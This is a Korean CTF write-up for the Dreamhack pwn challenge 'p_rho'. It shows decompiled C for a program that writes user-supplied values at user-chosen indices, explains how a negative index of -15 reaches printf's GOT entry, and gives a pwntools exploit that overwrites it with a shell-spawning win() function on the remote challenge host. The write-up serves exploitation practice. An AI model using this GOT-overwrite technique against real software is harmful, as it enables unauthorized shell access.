# p_rho
unsigned __int64 win()
{
  char *argv[3]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  argv[0] = "/bin/sh";
  argv[1] = nullptr;
  execve("/bin/sh", argv, nullptr);
  return v2 - __readfsqword(0x28u);
}

//----- (0000000000401216) ----------------------------------------------------
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // [rsp+8h] [rbp-18h] BYREF
  __int64 i; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  setvbuf(stderr, nullptr, 2, 0);
  for ( i = 0; ; i = buf[i] )
  {
    printf("val: ");
    __isoc99_scanf("%lu", &v3);
    buf[i] = v3;
  }
}

일단 이름이 p_fho이고 설명에 
pollard rho but not pollard rho?
라고 적혀있어서 pollard rho 알고리즘인줄 알고 조사를 개많이 함

근데 걍 got overwrite임

## 코드를 보면 scanf로 val 같을 받아서 buf에 그냥 두기 때문에
printf_got -> win 
으로 overwrite를 시키면 될 줄 알았는데 printf_got하고 win은 너무 커서 안들어감
그래서 printf_got을 대신 할 매계체가 필요했는데 그거를
gdb에서 buf의 주소를 \구하고 printf_got의 주소를 구해서 서로의 오프셋을 구해보면 

0x00000000004012e9 <+211>:   lea    rax,[rip+0x2d90]        # 0x404080 <buf>

[0x404008] printf@GLIBC_2.2.5 -> 0x7ffff7e04100 (printf) ◂— endbr64

pwndbg> p/x 0x404080 - 0x404008
$4 = 0x78

이고 0x78 만큼 차이나지만 해당 buf가 
  0x00000000004012d9 <+195>:   mov    QWORD PTR [rcx+rdx*1],rax

QWORD로 되어  있는것을 이용해서 % 8 을 해주면 서로의 오프셋이 15가 나옴

그로 인해 buf에서 printf_got는 -15만큼 떨어져있고
이를 pritnf_got의 주소를 대신해서 익스에 써주고 그 후에 win함수의 주소를 작성해주면 익스가 끝남

### 익스
from pwn import *
#p = process('./prob')
p = remote('host3.dreamhack.games', 9185)
e = ELF('./prob')

printf_got = e.got['printf']
win = e.symbols['win']
buf = 0x404080
p_got = 0x404008
p.sendlineafter(b'val: ', str(-15).encode())
p.sendlineafter(b'val: ', str(win).encode())    
p.interactive()